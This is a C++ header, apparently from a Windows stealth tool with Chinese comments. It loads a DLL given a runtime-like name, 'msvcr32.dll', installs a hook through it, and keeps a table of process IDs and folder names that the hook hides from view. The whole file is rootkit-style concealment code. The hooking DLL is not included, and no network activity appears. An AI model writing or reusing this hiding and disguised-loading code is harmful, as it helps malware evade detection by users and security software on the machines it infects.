#pragma once

#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")
#define MAX_PROC_NUM		32			// 最多隐藏进程数

typedef BOOL(__stdcall *funcUpdateHideProcTbl)(DWORD dwProcNum, DWORD dwProcId);
typedef BOOL(__stdcall *funcInstallHook)(HMODULE hModule);
typedef BOOL(__stdcall *funcUpdateHideFileTbl)(LPWSTR lpFolderName);

class CHideProcModule
{
public:
	static BOOL HideProcess(UINT dwProcID, LPCTSTR lpToke)
	{
		CString strData;

		strData.Format(TEXT("%d,%s"), dwProcID, lpToke);
		return CIPCModule::GetInstance()->SendMsg(HIDEPROC, strData, strData.GetLength());
	}
};

typedef struct _tPid_Toke
{
	INT pid;
	CString toke;
} PID_TOKE;

class CHideProcServer
{
public:
	static CHideProcServer& GetInstance()
	{
		static CHideProcServer obj;

		return obj;
	}
	~CHideProcServer() {}

public:
	BOOL LoadHideModule(CString &strPath)
	{
		CString strFileName = strPath + TEXT("\\msvcr32.dll");

		m_hModule = LoadLibrary(strFileName);
		if (m_hModule == NULL) {
			DWORD dw = GetLastError();
			return FALSE;
		}

		funcInstallHook func = (funcInstallHook)GetProcAddress(m_hModule, "InstallHook");
		func(m_hModule);

		return TRUE;
	}

	BOOL ProcessMsg(IPCMSG* pMsg)
	{
		CString strData = CA2T(pMsg->data);
		vector<CString> vParam;
		if (!CUtility::GetInstance().SplitString(strData, TEXT(","), vParam)) {
			return FALSE;
		}

		PID_TOKE pt;
		pt.pid = StrToInt(vParam[0]);
		pt.toke = vParam[1];
		HideProcess(pt);

		return TRUE;
	}

	BOOL HideFolder(LPCTSTR lpFolderName)
	{
		funcUpdateHideFileTbl fUpdateHideFileTbl = (funcUpdateHideFileTbl)GetProcAddress(m_hModule, "UpdateHideFileTbl");
		if (!fUpdateHideFileTbl) {
			LOG(TEXT("No find UpdateHideFileTbl"));
			return FALSE;
		}

		return fUpdateHideFileTbl(CT2W(lpFolderName));
	}

	BOOL HideProcess(PID_TOKE &pt)
	{
		funcUpdateHideProcTbl fUpdateHideProcTbl = (funcUpdateHideProcTbl)GetProcAddress(m_hModule, "UpdateHideProcTbl");
		if (!fUpdateHideProcTbl) {
			return FALSE;
		}

		size_t i = 0;
		for (; i < vPidTbl.size(); i++) {
			if (vPidTbl[i].toke == pt.toke) {
				vPidTbl[i].pid = pt.pid;			// 修改进程id
				break;
			}
		}

		if (i == vPidTbl.size()) {
			vPidTbl.push_back(pt);
		}

		for (i = 0; i < vPidTbl.size(); i++) {
			fUpdateHideProcTbl(i, vPidTbl[i].pid);
		}
		fUpdateHideProcTbl(i, 0);

		return TRUE;
	}
	
private:
	CHideProcServer()  {}
	HMODULE m_hModule;
	vector<PID_TOKE> vPidTbl;
};
